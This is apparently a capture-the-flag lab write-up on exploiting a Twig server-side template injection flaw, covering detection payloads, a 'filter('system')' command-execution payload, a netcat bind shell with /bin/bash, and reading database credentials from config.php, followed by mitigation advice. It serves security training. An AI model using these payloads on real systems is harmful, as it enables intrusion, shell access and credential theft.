---
title: "Server-Side Template Injection – Remote Code Execution via Twig & Bind Shell | Leaf"
date: 2026-03-29 12:30:00 +0530
categories: [Web Security, Injection]
tags: [ssti, server-side-template-injection, twig, remote-code-execution, bind-shell, netcat, linux, hackviser]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/ssti.webp
  alt: Server-Side Template Injection Exploitation
---

## Overview

This lab demonstrates exploitation of a Server-Side Template Injection (SSTI) vulnerability to achieve remote code execution and gain shell access on the target system.

The vulnerability arises due to improper validation of user input within a template engine, allowing execution of arbitrary commands.

---

## Objective

- Identify SSTI vulnerability  
- Determine the template engine  
- Achieve remote code execution  
- Gain shell access on the target system  

---

## Reconnaissance

A service scan was performed to identify open ports and running services:

```bash
nmap -sV <target_ip>
```

Result:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)
```

Directory enumeration did not reveal additional endpoints:

```bash
gobuster dir -u <url> -w <wordlist_path>
```

However, the web application allowed user comments without authentication, making it a potential injection point.

---

## Exploitation

### SSTI Detection

A basic SSTI payload was injected into the comment field:

{% raw %}
```
{{7*7}}
```
{% endraw %}

Response:

```
49
```

This confirmed server-side template execution.

### Template Engine Identification

Further testing:

{% raw %}
```
{{7*'7'}}
```
{% endraw %}

Returned:

```
49
```

This behavior indicates the use of the Twig template engine.

### Remote Code Execution

Twig allows command execution using filters:

{% raw %}
```
{{['<command>']|filter('system')}}
```
{% endraw %}

This confirms the ability to execute arbitrary system commands.

### Bind Shell Execution

A bind shell was initiated on the target:

{% raw %}
```
{{['nc -nvlp 1337 -e /bin/bash']|filter('system')}}
```
{% endraw %}

On the attacker machine:

```bash
nc -nv <target_ip> 1337
```

Connection established successfully, providing shell access.

---

## Post-Exploitation

After gaining shell access, sensitive configuration files were inspected:

```bash
cat config.php
```

This revealed database credentials:

```php
$username = "root";
$password = "********";
```

These credentials can be used to access the backend database and extract sensitive information.

---

## Impact

This vulnerability allows:

- Remote code execution on the server
- Full system compromise via shell access
- Exposure of sensitive configuration files
- Unauthorized database access

Such issues can lead to complete takeover of the application and underlying system.

---

## Mitigation

- Sanitize and validate all user input before rendering templates
- Avoid rendering user-controlled data directly in templates
- Disable dangerous template functions and filters
- Apply the principle of least privilege to backend services
- Secure sensitive configuration files and credentials

---

## Real-World Insight

SSTI vulnerabilities are highly critical as they often lead directly to remote code execution. Modern template engines such as Twig and Jinja2 can become dangerous if user input is not handled securely.

This type of vulnerability is commonly associated with injection flaws and aligns with risks identified by OWASP.

---

## Conclusion

This lab demonstrates how a simple input field can lead to full system compromise when proper validation is not enforced. Identifying SSTI and leveraging it for command execution is a critical skill in web application security testing.